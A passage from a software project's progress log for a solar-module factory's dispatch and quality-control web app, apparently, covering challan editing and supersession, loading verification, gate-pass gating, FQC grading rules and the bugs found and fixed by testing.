- [x] `POST /api/challan/<id>/discard` — cancels a draft, freeing the boxes
      and serials it reserved (same "cancelled, never deleted" rule as
      everywhere else).
- [x] `db.assign_customer_on_challan()` — a General Stock box (customer
      `NULL`) becomes the invoice's buyer's the moment it is written to a
      challan; Packing is not touched. Also recognises a box whose
      `customer` column holds the STOCK pseudo-customer's **display name**
      ("ICON STOCK") instead of its code — a real, pre-existing Packing-side
      data bug, found by testing against a copy of the live database, not
      fixed at its source but no longer able to strand a box permanently.
      Never overwrites a box that already names a different real customer.
      Kept as its own function so the decision is easy to move earlier.
- [x] A repacked box's serials sit in `box_serial` under **both** the
      retired parent and the live child (by design, so "what did this
      pallet hold?" stays answerable) — `submit`'s box recovery was
      matching both and re-checking the retired parent. Fixed to join only
      the live box, the same way `serial_in_live_box()` already does.

**What changed — client (`icon_live.js`).**
- [x] Real box list, ticked order preserved and shown in the "List status"
      column (issue badges, or "General Stock").
- [x] An invoice selector, injected — v4 had none. Selecting one fills
      buyer, GSTIN, address, contact, consignee, transporter, vehicle no.,
      LR no. and e-Way Bill no., all editable afterward; declared quantity
      and model are shown as the reconciliation target, explicitly **not**
      editable there.
- [x] `chParty` converted from v4's four-option `<select>` to free text —
      a real buyer is whatever the invoice PDF said, not one of four names.
- [x] The rail reads the server's own refusal list — no client-side rule
      is a softer copy of the server's. Create is disabled the instant any
      check fails and only that.
- [x] A saved draft locks the box table and every detail field; **Discard
      draft** releases them. Create, pressed against an existing draft,
      submits it rather than creating a second challan.
- [x] Outputs card says plainly there is nothing to print before something
      is created; afterward, direct links to the *exact* challan's existing
      `/print` and `/excel` routes — neither route was touched.
- [x] The challan number is **not** drawn merely by opening the screen (v4
      did this) — only at Save as draft or Create, the real counter.
- [x] Tests: `test_challan.py` (28) and `test_challan.js` (20), each naming
      the rule it defends. Every rule mutation-tested — broken one at a
      time and confirmed the matching test catches it.

**Round 2 — feedback from real use.**

- [x] **No duplicate serial was a comment, not a check.** The rail said "a
      serial sits in exactly one live box, so this cannot happen here" —
      assumed from an invariant, not verified, and repack had already shown
      that invariant can go stale (a retired parent keeps its `box_serial`
      rows alongside its live child). Replaced with a real query: every
      serial in every ticked box is checked against `challan_serial` for
      **every challan that has ever existed** — no financial-year scoping,
      no date cutoff, imported history included — via
      `db.serials_already_dispatched()` and `db.serial_last_challan()`,
      naming the exact serial and the exact document. A second, independent
      check catches the same serial ticked via two *different* boxes in one
      request, which the history check alone would not (neither box need
      already be on any challan). `db.serials_already_dispatched()` gained
      an `exclude_challan_id` so a draft can re-check itself without
      colliding with its own reservation.
- [x] **Challan details trimmed to what the invoice does not already
      manage.** Party, GSTIN, PAN, state, buyer address, the Consignee
      block, vehicle no., transporter, LR no., e-Way Bill no. and the whole
      Order Reference section are the invoice's own fields — filled from
      it, never re-typed here, and now hidden rather than shown a second
      time for no reason. What is left: Challan date, Contact person,
      Contact no., Driver name, Driver mobile, Driver licence no. — decided
      at dispatch, not on the invoice. The hidden fields are still filled
      from the invoice and still written to the challan row for printing;
      only the display changed.
- [x] **Clear form.** v4 had no way to abandon a filled-in screen short of
      reloading the page. A **Clear form** button empties the invoice
      selection, every field and every ticked box in one confirmed action —
      refused (with a reason) once a draft or a created challan exists,
      since that is a real reservation a form reset must not quietly undo.
- [x] **Contact person / Contact no. often came back blank.** The invoice
      keeps the buyer's and the consignee's contact separately, and on a
      real PDF only one side, or neither, may have it filled in. Now
      prefers the buyer's, falls back to the consignee's, and — the part
      that was actually being asked for — **shows both** when both are
      present and differ, rather than silently keeping one and dropping
      the other. A "Contact no." field was added; v4 only had a name.
- [x] Tests: 4 new `test_challan.py` cases for the duplicate-serial rule,
      9 new `test_challan.js` cases for contact fallback and Clear form.
      Every new rule mutation-tested. (`test_challan.py` 31, `test_challan.js`
      29.)

**Open, out of scope for this pass:**
- Search / filter / scroll on the box-select table (`data-itable` pattern)
      — the table is a selection UI, not a report; can be added the same
      way every other screen's table already works.
- Driver licence no., From/To place, Destination site, Freight rate,
      Delivery order no./date, Sales order ref., Contractor, Remarks — v4's
      fields exist (the driver ones now shown; the rest hidden this round)
      but the `challan` schema has no column for any of them and nothing
      downstream reads them; left unpersisted pending a decision on
      whether they are wanted at all. Contact person / Contact no. are the
      same: shown and filled, not currently saved with the challan row.
- The root cause of boxes holding `customer='ICON STOCK'` instead of the
      code `STOCK` is at Packing, not here — worked around, not fixed.
- A box ticked, then taken by someone else's draft before this one submits,
      is caught by the server (the same `_challan_precheck`) but the
      screen does not yet remove it from the ticked list on its own —
      the create/draft is simply refused and named.
- The Party/Consignee/Order-reference hide-and-relabel logic is DOM-tree
      traversal (`.bomgrid`'s children, in document order) that this
      machine's test harness cannot exercise without a real browser — no
      Node, no browser available here. Traced by hand and correct as far
      as that goes, but not run against a live DOM; worth a once-over in
      the browser before relying on it.

**Round 3 — real Edit, replacing what `clEditChallan()` did before.**

**What was wrong.** `clEditChallan()` called `/discard` the instant Edit
was clicked — before the operator had changed anything — which for an
issued challan *is* a cancellation: every serial reverted to `packed` and
the document was marked `cancelled`, as a side effect of opening a form.
Cancel and Edit had become the same action. It also read
`d.boxes[i].box_serial`, a column `challan_box` has never had (the real
ones are `box_no`, a printed label, and `challan_box_id`) — always
`undefined`, which is the exact "BAD box id" symptom.

**The model, built to match.** Edit reserves nothing and writes nothing —
`POST /api/challan/<id>/edit-draft` only *reads*, resolving each
`challan_box.box_no` back to its live `box_id` server-side (never a
client guess). Because nothing is written, abandoning an edit — the
explicit **Cancel edit** button, or simply navigating away, both wired —
needs no cleanup: there is nothing on the server to release. Saving
(`POST /api/challan/<id>/edit-save`) writes a **new** challan row at the
same `(fy, seq)` with the next `M` suffix (`MA`, then `MB`, …) — the same
mechanism already used for a historical hand-patched collision
(`742` / `742 (A)`) — and marks the original **`superseded`**, a new
status distinct from `cancelled`, kept fully intact and visible with a
link to its replacement. Only the current live version of a lineage is
ever editable; a superseded row, however many generations back, is
refused with the reason. Only the invoice is locked — the server decides
its value from the original record, never the client, and rejects any
attempt to submit a different one; everything else (vehicle, driver,
transporter, LR no., and the box selection itself) may change. A box
dropped during an edit reverts to `packed`, same as Cancel already leaves
a serial in.

**A real bug found by testing, not assumed away.** A superseded
ancestor's `challan_serial` rows are never deleted (by design — "what did
this shipment hold?" must stay answerable), so editing `MA` to produce
`MB` initially failed: the duplicate-serial check saw the original's rows
and refused a challan attempting to re-select its own boxes. Fixed by
widening every duplicate-serial and box-availability check to exclude the
whole `(fy, seq)` lineage, not just the one row being edited —
`db.serials_already_dispatched()` / `serial_last_challan()` now accept a
set of ids, and a new `_lineage_ids()` computes it.

- [x] Schema: `challan.superseded_by` / `superseded_at` /
      `superseded_by_user` (mirrors `invoice.superseded_by`'s existing
      shape), migrated for a database that already exists.
- [x] `POST /api/challan/<id>/edit-draft` — read-only, resolves real
      `box_id`s, refuses on anything but the current issued version or a
      gate-pass lock (same lock Cancel already shares).
- [x] `POST /api/challan/<id>/edit-save` — writes the `MA`/`MB`/… row,
      supersedes the original, releases dropped boxes, re-checked against
      the shared `_challan_precheck` gate exactly like a fresh Create.
- [x] `GET /api/challan/boxes?exclude_challan_id=` — lets Edit see its own
      (lineage-wide) boxes as available without writing a reservation.
- [x] `clEditChallan()` rewritten around the two new endpoints;
      `chBeginEdit()` / `chAbandonEdit()` added; the invoice selector
      locks, everything else stays editable; `go()` calls
      `chAbandonEdit()` on navigating to any other screen.
- [x] Challan List / Detail: a `superseded` badge, distinct from
      `cancelled`, with a link to the replacement.
- [x] Tests: 18 new cases in `test_challan.py` (49 total), each naming
      the rule it defends. Every rule mutation-tested, including the
      lineage bug above once fixed.

**Open:** `api_challan_cancel` is unchanged, exactly as asked — Cancel
stays a separate, unreachable-from-Edit action. Whether it is actually
gated to admins in the UI was not touched or verified either way; the
instruction described it as already true and out of scope for this pass.

**Round 4 — two bugs found once Round 3's Edit was tested against a
challan with real boxes already on it, not an empty one.**

- [x] **`chRunChecksNow()` never sent `exclude_challan_id`.** The live
      verification rail called `/api/challan/checks` with `chEditingId`
      sitting right there, unused — so opening Edit on any challan with
      boxes on it already showed every one of its own boxes as a
      "duplicate serial", the exact false refusal Round 3's server-side
      widening was built to prevent. Fixed by sending it, exactly as
      given: `exclude_challan_id: chEditingId || undefined`.
- [x] **A second edit's rail excluded only the challan being edited, not
      its whole lineage.** `/api/challan/checks` passed the client's
      single `exclude_challan_id` straight to `_challan_precheck` without
      the `_lineage_ids()` widening `edit-save` itself already applies —
      so editing `MA` into `MB` warned about the box's own entry under the
      **original's** id, which editing never deletes (Round 3's own
      finding). The save would have gone through regardless; the rail
      was lying about it first. Fixed by widening `exclude_challan_id` to
      `_lineage_ids(cur, exclude)` before the precheck, the same way
      `edit-save` already does.
- [x] **Invoice-first, customer-filtered box list.** `GET
      /api/challan/boxes` returned every unreserved closed pallet
      regardless of buyer — a box belonging to a different customer than
      the selected invoice was tickable, refused only after the fact by
      `_challan_precheck`. It now **requires** `invoice_id` (`[]` without
      one) and filters to General Stock or that invoice's buyer's own
      boxes, resolved the same way `_challan_precheck` resolves ownership.
      "Challan details" (the invoice selector) was moved physically above
      "Select boxes" in the DOM — v4's `.wmain`/`.card` grid has no
      explicit `grid-row`, so at desktop width visual order **is** DOM
      order; the `.o1`/`.o2`/`.o3` CSS `order` classes only take effect
      under 1400px. `chInvoiceChange()` now re-fetches and re-renders on
      every change, in every branch; `chClearForm()` had the same
      staleness bug one level up — it cleared `chInvoiceId` but re-rendered
      the box table from the still-populated `chBoxes` array — fixed the
      same way.
- [x] Tests: 2 new `test_challan.js` cases for `exclude_challan_id`, 4 more
      for invoice-first filtering (`test_challan.js`, 35 total); 1 new
      `test_challan.py` case for the lineage-widening bug on the live rail
      (55 total). Every rule mutation-tested — the lineage one reproduces
      the exact false "already on IS-…" warning before the fix.

## 16. Loading Verification — NEW SCREEN (Team 3)

- [x] Two modes: **Scan boxes** (for gate pass) and **Verify serials**.
- [x] Verify serials: scan a box, load its serials from the database.
      Two columns, scan box on top.
      Column 1 — the box's serials as recorded.
      Column 2 — blank, filled as each barcode is scanned.
      A scan that matches lands on that row in column 2, highlighted **green**.
      A scan that matches nothing shows **red**.
- [x] Purpose: prove a box has not been opened or tampered with. **Writes
      nothing to the ERP** — that is what makes it a check rather than a
      record.

## 16a. Printing  *(built)*

- [x] Every format opens a **print dialog with the real document**, not a
      "sent to printer" toast. v4's `printDoc()` ended in `window.print()`,
      which printed the screen — sidebar, filters and all.
- [x] Packing list, challan version 1, Flash Test Report, gate pass all print;
      challan version 2 downloads as Excel.
- [x] Copies are laid out as separate pages with a "Copy 1 of 3" footer rather
      than silently sent three times. **Who prints how many is the operator's
      call** — a claim that three copies were printed is not one this system
      can honestly make.
- [x] `/api/print/resolve` turns v4's `(kind, ref)` into the real document URL,
      and says plainly when the document does not exist yet.

## 16b. Loading Verification — challan-level session  *(built)*

**What it is.** Section 16 above checks one PALLET's contents against what
Packing recorded — unchanged, still exactly that. This is a different
question: has every pallet on a CHALLAN actually been found and put on the
vehicle, confirmed by Team 3, before that challan's own print and Excel
documents may be produced. The two are complementary, not duplicates, and
the existing screen is one click away from the new one rather than folded
into it.

- [x] Schema: `challan_box.loading_status` (`pending` / `saved` / `loaded`,
      default `pending`) plus `loading_scanned_at` / `loading_scanned_by`.
      A fourth value for a swapped-but-not-yet-rechallaned pallet is
      deliberately deferred, pending a separate design pass — nothing
      produces it yet and its meaning is not settled, so it is not added.
      Swap itself is explicitly out of scope this round: if a pallet is
      wrong or missing, the resolution is to leave without submitting,
      **Edit** the challan (the `(MA)`/`(MB)` mechanism above), and start a
      fresh session against the new `challan_id`.
- [x] `GET /api/loading/challans` — one row per **live** challan (issued,
      not cancelled, not a superseded original — the same filter Challan's
      own issued-list already applies), aggregated pending / in-progress /
      loaded, with a date range (default today), search and status filter.
- [x] `GET /api/loading/<id>` — the challan's own pallets in load order;
      model and grade are resolved from the **live** box each time (Quality
      may have moved a grade since packing), never a stale copy on
      `challan_box`.
- [x] `POST /api/loading/<id>/confirm` — the only write. Sets one pallet
      `saved` with who and when; this **is** the save, there is no separate
      step.
- [x] `POST /api/loading/<id>/submit` — refuses unless every pallet is
      `saved` (or already `loaded`, so re-submitting a complete session is
      a safe no-op), naming exactly which are not; promotes every pallet to
      `loaded` together, in one statement.
- [x] `/challan/<fy>/<seq>/print` and `.../excel` refuse until every pallet
      on that challan is `loaded` — the same no-override principle as
      quantity reconciliation, not a UI convenience. Historical
      (`origin='historical'`) challans predate this screen entirely and are
      not gated; there is no session to hold them to.
- [x] Landing list (`data-itable` + a server-side date/search/status
      round-trip, same convention `clInjectView` already established) and
      a per-challan session overlay: type or scan a pallet number, Enter
      looks it up **against this challan's own list** (rejected clearly if
      it is not on it), Space confirms. A fully loaded session renders
      **read-only** — no scan field, no Save & Submit, just the record.
      A **Verify one pallet's contents →** button opens the existing,
      untouched pallet-contents check (`frag_loading.html`, served at
      `/view/loading`) as a real `v-loadver` section inside the app shell —
      see the "opened a browser tab, not a screen" fix below.
- [x] The existing `NEW_VIEWS` nav entry `loadver` ("Loading Verification",
      positioned before Gate Pass) already reserved the icon, label and
      slot, fetches `/view/loading` into `v-loadver` once at sign-in, and
      is what the nav button itself opens (redirected to the landing list
      above, the same way the existing `challan` → `challan-list` nav
      redirect already works). The fragment it fetches is untouched.

**Round 2 — three bugs found once this was tested against a realistic,
already-populated challan and a real fetch, not an empty screen.**

- [x] **The "N rows" count went stale.** `data-itable="loading"`'s own
      count logic only reacts to ITS OWN search/filter controls firing;
      `ldLoad()` replaces the whole `tbody` directly from a server fetch on
      a date range and status this screen filters server-side — two
      triggers claiming the same number is how it drifts. Fixed by picking
      one owner: the card no longer carries `data-role="count"` at all,
      and `ldRecount()` sets the badge directly from `ldRows.length` (plus
      the search box's own text match) at the end of every `ldLoad()`
      call, success or failure.
- [x] **"Verify one pallet's contents" left the app.** It was a plain
      `<a href="/loading" target="_blank">` — the exact "two apps" problem
      already fixed once elsewhere, reintroduced here. It now calls
      `go('loadver')` directly (no nav-i element, so the landing-list
      redirect above does not fire) to show the real, already-fetched
      `v-loadver` fragment in-app. Since that fragment has no idea it now
      lives inside a v4 section instead of its own page, `loadView()`
      prepends a close bar (`ldInjectPalletCheckClose()`) the one time it
      loads `id === 'loadver'`, wired back to `go('loading-list')`.
- [x] Tests: 3 new `test_loading.js` cases for the count badge (asserted
      against the actual rendered row count, not "the fetch succeeded"),
      3 more for the in-app pallet check and its close button (`test_loading.js`,
      17 total). Every rule mutation-tested.

**A real bug found by testing, not assumed away.** `_challan_bundle` (used
by print, excel and FTR) resolves a bare `(fy, seq)` with no `?suffix=` to
the row where `suffix IS NULL` — which, once a challan has been edited, is
the **original**, now-superseded row, not whichever generation is
currently live. A test that simply printed the plain number right after an
edit got back the stale document, with a 200. Fixed with
`_refuse_if_superseded()`: any superseded row, however it was reached,
refuses print/excel by name, pointing at its replacement. Covered in both
`test_challan.py` (this is a Challan-level fact, not a Loading one) and
exercised again end-to-end in `test_loading.py`.

- [x] Tests: `test_loading.py` (10 cases) and `test_loading.js` (11 cases),
      plus one new regression case in `test_challan.py` for the
      superseded-print bug above (50 total there). Every rule mutation-
      tested; two mutations were later judged non-issues (redundant
      defense-in-depth already covered by a more direct test) rather than
      real gaps, and are noted as such rather than chased further.

**Open, out of scope for this pass:**
- The Flash Test Report route (`/challan/<fy>/<seq>/ftr`) was not given the
      same superseded-row refusal the print/excel routes got — not asked
      for, and left alone rather than expanding scope unprompted.
- The landing list's date-range and status filters round-trip the server
      (like Challan List's own search already does) rather than running
      through `icon_table.js`'s client-side text filter, since a date range
      is not something that convention expresses; the search box, reset,
      export and row count are still the shared `data-itable` behaviour.
- Whether the `loadver` nav button is correctly role-gated to the roles
      `NEW_VIEWS` already lists for it was not re-verified as part of this
      change — only its destination changed.

## 17. Gate Pass

- [x] For modules and for all other materials.
- [x] RGP and NRGP, with the copy counts already agreed (NRGP 3: creator + 2
      gate; RGP 3: creator, gate, recipient — recipient returns theirs).
      **Settled:** `ISGP260831/0667`, one series for every type, sequence
      resets on the financial year, padded to 4. Padding is display only.
      *(checked 7 Oct: built - gatepass_print, three copies a page each)*

**Live-layer fix — v4's original fields left sitting beside the real
ones.**

**What was wrong.** `wireGp()` already injects the real "Issue details"
fields (Type, Party / destination, Material going out, …) — but it
injects them ABOVE v4's own original card content instead of replacing
it, so three fields `issueGP()` never reads stayed on screen, looking
just as real: a "Gate pass no." input PRE-FILLED with the literal
`GP-2608-0031` (the actual number is only known once the server assigns
it on submit), a "Delivery order no." and a "Container no." that map to
nothing this system tracks. The same fake number was also baked into the
"Gate pass preview" card's Print/Export PDF buttons, whose `onclick`
already resolved it against `/api/print/resolve` — a document ref that
never existed server-side, so both buttons already failed silently with
a toast naming that exact fake number.

**What changed (`static/icon_live.js` only — `icon_trace.html` untouched,
per the standing rule).**
- [x] `gpFldFor(label)` / `gpHideUnwiredFields()` — hides the three
      unconnected `.fld`s by label text (`style.display='none'`, not
      removed, so nothing downstream that reads the DOM by position
      breaks), hides the now-meaningless "Placeholder series… PS format"
      warning note next to where the fake number used to show, and strips
      `GP-2608-0031` out of the two preview buttons' `onclick` in place.
      Called once per `wireGp()` — idempotent, so re-navigating to Gate
      Pass re-running it is harmless.
- [x] Tests: `test_gatepass.js` (new, 7 cases) — a realistic populated
      "Issue details" card (the real injected fields alongside v4's
      original ones, exactly as `wireGp()` actually renders it), asserting
      the three dead fields and the stale note are hidden, the real ones
      are not touched, both preview buttons lose the fake ref, and nothing
      on the card contains `GP-2608` or `PS26812` anywhere after cleanup —
      the literal assertion the bug report named. Every rule
      mutation-tested.

**Open, not decided here:** v4's Create Challan screen has its own,
separate "Delivery order no." / "Delivery order date" pair (Order
reference section) with the same `PS26812-0007` placeholder and the same
"unconnected to anything real" problem — out of scope for this pass since
the bug report and its test both named the Gate Pass form specifically,
but the same question (do either of these map to a real field, e.g. LR
no.?) applies there too and is still open with Mukesh.

**Module mode — the checkbox-gated dual flow, built  *(built)***

**What was wrong.** Gate Pass had exactly one flow: hand-typed
party/vehicle/description/qty, with a challan selector that only ever
*pre-filled* those fields as a convenience — nothing stopped a module
gate pass from being issued before the modules on its challan were
actually confirmed on the vehicle. Loading Verification's own
`loading_status` work (already correct, already gating print/excel) had
no connection to Gate Pass at all.

**The model, as agreed with Mukesh.** A checkbox — "This gate pass is for
solar modules" — splits the screen into its two real modes. Unchecked:
today's standalone flow, hand-typed, no challan, untouched. Checked: a
challan selector appears; picking a live, issued challan force-fills
party/vehicle/material/quantity from it and **locks** those fields
(`readOnly`, confirmation rather than data entry), shows a plain tag
naming exactly how many pallets are loaded, and disables Issue until
every pallet on that challan is confirmed — the same rule the print/excel
routes already enforce, not a second version of it.

**What changed — backend (`app.py`, `icon_barcode.py`).**
- [x] `GET /api/challan/<id>` now carries `loading_agg` / `loading_why` /
      `loading_n_total` / `loading_n_loaded` on the challan object,
      computed by calling `_loading_agg_status()` and
      `_loading_incomplete()` directly — the exact functions Loading
      Verification's own landing list and the print/excel refusal already
      call. The client reads these, rather than recomputing the
      aggregate itself from `bundle.boxes`, so the two can never drift
      apart. Historical challans report `loaded` unconditionally, the
      same exemption print/excel already give them.
- [x] `POST /api/gatepass` refuses a challan-linked gate pass whose
      loading is incomplete — keyed on **`challan_id` being present and
      resolving to a real, issued challan**, never on a client-sent
      `is_solar` flag. Also refuses a `challan_id` that does not exist or
      is not `status='issued'` (draft, cancelled). Standalone gate passes
      (no `challan_id` at all) are completely untouched.
- [x] `bc.gp_qr_payload(gp_no)` — `ICONTRACE|GATEPASS|<gp_no>`, the same
      identity-only shape `box_qr_payload` already uses. `/gatepass/<no>
      /print` renders it into `gatepass_print.html`'s header, the same
      place the logo already sits (logo untouched, was already correct).

**A real bug found by testing, not assumed away.** The first working
version gated the loading check on the client's own `is_solar` flag:
`if (is_solar) { ...check...}`. A request that simply omitted `is_solar`
(or sent it `false`) while still linking a real, incomplete `challan_id`
skipped the check entirely and issued anyway — the exact "trust the
button state" gap the no-override discipline exists everywhere else in
this project to close (the quantity gate, the e-Way Bill expiry check).
Rewired to key on `challan_id` itself, a fact resolved against the real
row, never a client assertion. `test_gatepass.py` reproduces this exact
bypass directly (POSTing with `is_solar` omitted, and again with it
`false`) rather than trusting the disabled button.

**What changed — frontend (`static/icon_live.js` only).**
- [x] `#gpIsSolar` checkbox, injected the same way `gpParty`/`gpDesc`
      etc. already are; `gpToggleSolarMode()` shows/hides the challan
      selector and locks/unlocks the four challan-derived fields.
- [x] The challan `onchange` handler force-fills those fields and renders
      `#gpLoadingState` from the server's `loading_agg`/`loading_why` —
      not recomputed client-side — setting `window._gpChallanReady` and
      `Issue`'s `disabled` state from it.
- [x] `issueGP()` refuses client-side (`toast`, no request sent) when
      module mode is checked and `_gpChallanReady !== true` — so the
      operator finds out before submitting, not from a refused POST. The
      server rule above is what actually matters; this is the courtesy on
      top of it, not instead of it.

**A second, unrelated bug found while verifying this live, not by
reading the code.** `wireDisp()` (Stock & Dispatch's own donut chart,
from an earlier, separate pass) had a stray extra `});` in the middle of
an `if` block, followed by ~12 lines of dead code referencing variables
that were never in scope — syntactically broken in a way that silently
poisoned the *entire* live layer the moment anything downstream tried to
parse past it, throwing "Unexpected token ')'" with no useful line
number. Found by bisecting the file at real function boundaries through
a headless browser's own parser (`new Function(source)`) rather than by
inspection — reading the surrounding code repeatedly found nothing wrong,
because there was nothing wrong nearby; the actual break was several
hundred lines earlier. Fixed by removing the stray closer and the dead
code after it, keeping the one working `drawDonut(...)` call.

- [x] Tests: `test_gatepass.py` (11, was 3 — the original file also
      `os.remove()`'d the real `icontrace.db` directly rather than using
      an isolated `ICON_DB_FILE`, and used `unittest` instead of this
      project's own `@test()` runner; rewritten to match every other test
      file's convention, including the isolated-DB discipline). New
      `test_gatepass.js` cases (12, was 7) cover the checkbox's two
      states, the client-side Issue gate (ready / not-ready / no challan
      selected), and that standalone mode never consults
      `_gpChallanReady` at all. Every rule mutation-tested, including the
      `is_solar` bypass and the client-side gate.
- [x] Verified live against a running server with Playwright (55 checks
      across four scripts) — the checkbox reveal, field locking, the
      loading tag for both an incomplete and a fully-loaded real challan,
      a direct bypass POST refused server-side, and an actual successful
      issuance end to end.

**Open, not decided here:** the copy-count/RGP-NRGP item above this
section is unrelated and still open. Whether module-mode fields should
stay locked if the operator unchecks and rechecks the box mid-edit, and
whether a second gate pass against an already-gate-passed challan should
warn, were not raised and were not touched.

## 18. Hold & Needs Review  *(decided, not yet built)*

Mukesh's answers, 4 Sep:

- **Nobody releases their own hold.** Raised by one person, released by
  another. Handled between Mukesh and Humesh for now.
- **A second signature depends on impact.** Routine grade correction on an
  unpacked module: one person. A release reaching packed or dispatched stock:
  two.
- **A held module on a challan draft blocks the draft.** The draft cannot be
  confirmed or resolved while it contains held stock — quantity silently
  changing under an invoice is the worse failure.
- **No expiry.** A hold stays until somebody decides. That is deliberate: an
  expiry makes the system responsible, and Mukesh wants the user responsible.
- **Admin sees the queue.**
- Quality freeze on a material lot: deferred, to be specified later.

- [x] **FQC passes or rejects; it does not grade.** A pass is grade A and
      means Pmax at or above the nameplate with a clean EL — the label's
      number, not a band below it. ~~A pass cannot be overruled~~: a module
      that measures short goes back to the Sun Simulator, because a pass is
      the only thing that reaches a customer as a full-power module.

      Prediction was dropped because SS and EL are two of five kinds of
      evidence and cannot carry a verdict. **The SS wattage floor is
      unchanged and still enforced** — a module below nameplate is never
      passable. Revisit if stronger evidence becomes available.
      What is rejected has no grade until Quality calls it GY or BGY on its
      own screen, from the SS reading, the EL image and what FQC recorded —
      coded defect, override reason, note. No grade is what keeps it out of
      a box.
      `OV-OTHER` says nothing on its own, so the note is compulsory with it.
- [x] **Existing Decision** on the lookup shows what FQC said last time, so
      a module coming round again is judged knowing that.
- [x] **The EL/VI image opens for real** — wheel to zoom at the pointer,
      drag to move, double-click to fit, arrows and +/−/0 without a mouse.
      v4 drew a placeholder saying the image would render there. It opens
      from the Quality screen too, looking the verdict up rather than
      borrowing whatever FQC last scanned.
- [x] **Every reading reaches the panel.** `gather()` returned the values
      only inside `params`, so Voc, Isc and Fill factor showed as `—` beside
      a Pmax that was read fine.
- [x] **Space and Esc work.** v4's handler tests `fqcHold`, its own variable,
      which the live flow never sets — so the shortcuts the scan hint
      promises did nothing. Space confirms a proposed pass and is ignored
      while typing; Esc discards.
- [x] **The modal × is in the corner again.** It sits after `.mh-r`, which
      carries the `margin-left:auto`, and `modalMode(true)` hides that group
      for a generic modal — so the × collapsed against the subtitle on every
      popup that is not the serial list.
- [x] **Pmax is compared to the wattage**, in those words. "Nameplate" is not
      how the floor says it.
- [x] **Allocation type** — pre-shared or post-shared, chosen in Planning and
      recorded on the batch, shown on the allocations list, the FQC lookup
      and the module's journey. Pre-shared is serials issued before the
      modules exist; post-shared is allocated out of what was built.
- [x] **Quality sees the evidence** — the EL image and the full Flash Test
      values, not just Pmax.

- [x] **Space confirms the proposal either way.** Agreeing with a proposed
      rejection is the common case and now costs one key: the defect comes
      off the EL and the note is there for anything worth adding. It is
      ignored while typing, so a space in the note stays a space.
- [x] **An EL-only rejection can be overruled; a short reading cannot.**
      Pmax is a measurement — no reason turns a module that measures short
      into one that makes its wattage, and the way up is the tester. The EL
      verdict is the name of a folder somebody filed an image in, so an
      operator who has looked at the image may overrule it, with a coded
      reason. Both halves are enforced server-side.
- [x] **Quality says why.** GY and BGY are not interchangeable, so the
      decision popup shows the reading, the EL verdict, the FQC defect,
      reason and note, offers the image and the flash values, and requires
      the reasoning before it will record a grade.
- [x] **The stale-server banner is for whoever can act on it.** It told
      every operator the server was running newer code — which was both
      untrue and unactionable. The server now reports the build it loaded
      at startup beside the live one, so "restart me" goes to Admin and
      everyone else just gets "reload".

- [x] **One live decision per module.** A module judged again — retested
      after a rework, or looked at twice — supersedes its earlier decision
      rather than adding a second. The old row is kept and points at what
      replaced it, so the trail is intact, and every count reads the live
      row only: a retested module is one module, not two.
- [x] **A module in a box cannot be re-judged where it stands.** Recording
      a decision moves the serial's state, which would leave the box holding
      a module the record says is not in it. Take it out first.
      **Superseded, §19b:** a flat refusal is no longer right once
      duplicate-scan detection exists — the attempt is compared against the
      packed record instead, and only a genuine disagreement raises
      anything, held for a person to resolve rather than blocked outright.
- [x] **Going against the evidence is asked about once.** Agreeing with it
      stays a single key.
- [x] **The reason field is only for overruling.** Agreeing with a proposed
      rejection overrules nothing, so it no longer asks for a coded reason
      to do exactly what the evidence said.
- [x] **The scan box lets go after Enter**, so the next Space confirms
      instead of typing a space into the barcode field.
- [x] **Pmax and the EL verdict are coloured** by whether they satisfy the
      rule — the two values the decision turns on, and nothing else. The
      source chips went neutral: "Read live from Line A" was green, which
      read as a pass beside a rejection.
- [x] **The journey says what happened at FQC.** It read the grade column,
      which is empty until Quality calls a reject — so every rejected
      module's journey said `None`.

### Routes in — enforced today

- [x] **The measurement is the server's, never the browser's.** `/api/fqc`
      accepted an `evidence` object and trusted it, so a body claiming
      `{"ss_state":"OK","pmax":631}` walked a module the tester had failed
      to read twice past the BAD block and into `fqc_record` as a 631 W
      reading. Evidence is gathered inside the route now; the client sends
      the judgement only. Same for `proposed` (the override rule fires
      against the server's proposal) and `mode` (a grade decided with the
      tester unreachable is provisional however the request describes it).
- [x] **A stale screen is told, not overwritten.** The lookup hands out an
      `evidence_token`; if the module was retested while the operator was
      deciding, the grade is refused with what it reads now. A failed
      retest is not a change — the latest valid row still wins.
- [x] `BAD` probe fault blocks grading
- [x] Serial not in master refused at FQC and Packing
- [x] Duplicate: already in a live box
- [x] Duplicate: on two challans (import blocks the batch)
- [x] Module packed with no FQC grade
- [x] Wrong grade or model scanned into a box
- [x] e-Way Bill expired blocks dispatch
- [x] Quantity mismatch blocks the challan, no override

### Routes in — designed, still to build

- [ ] `NA` queued rather than only shown
- [x] Provisional grade disagrees when evidence arrives - a
      `provisional_mismatch` item in Needs Review; agreement releases it by
      itself (Round 10, second follow-up)
- [ ] Evidence mismatch on sync
- [~] Provisional never confirmed - it stays on the Hold & Deviation list,
      with no expiry (Mukesh: a hold stays until somebody decides). No alert
      yet for one that has waited too long.
- [x] Grade change on a packed module forces the box open — built as
      "keep the rescanned one" in §19b's duplicate-scan resolution, via the
      real `_repack()` removal path, not a second one.
- [ ] Indent says DCR, material issued says NDCR
- [ ] Invoice superseded under a new IRN
- [ ] Quality freeze on a material lot *(awaiting spec)*

### Resolution

- [ ] Review ends as confirmed / corrected / rejected / cleared-as-identity
- [ ] Hold ends only as released-with-a-reason, by someone other than the
      raiser, with a second signature where the impact reaches packed or
      dispatched stock

## 19. Controls

- [x] Quality involvement — review queues, who clears what.
      Built as one merged feed rather than two screens — see §19b.
      Grade issues go to Quality (a role added for exactly this — none
      existed), serial existence and the duplicate-scan conflicts below go
      to Production Shift Incharge or above, and a conflict discovered
      after dispatch is Admin-only.

## 19b. Quality Decision merged into Needs Review; duplicate-scan detection  *(new)*

**STEP 0, before building anything:** checked whether Needs Review had a
real table/endpoint behind it yet, the way Gate Pass and Challan turned out
to be a mix of real and hardcoded pieces recently. It did not — `v-review`
was 100% v4 demo: three hardcoded `<tr>` rows, hardcoded KPI numbers, and
`rvResolve()` only faded a row and wrote a client-side audit line that was
never sent anywhere. Quality Decision, by contrast, was fully real:
`/api/quality/pending`, `/api/quality`, `db.record_quality()`, backed by
`fqc_record.quality_grade` and covered by tests in `test_fqc.py`. So the
merge is a real screen absorbing a demo one, not two real screens colliding.

**The merge.** `v-review` (native v4 markup, never edited) is now overwritten
live from `GET /api/review` — one feed, two sources: a `quality_grade`
"item" is still read straight from `fqc_record` exactly as
`/api/quality/pending` always did (nothing about the grading rules or their
tests moved), and a `duplicate_scan` item is a real row in a new
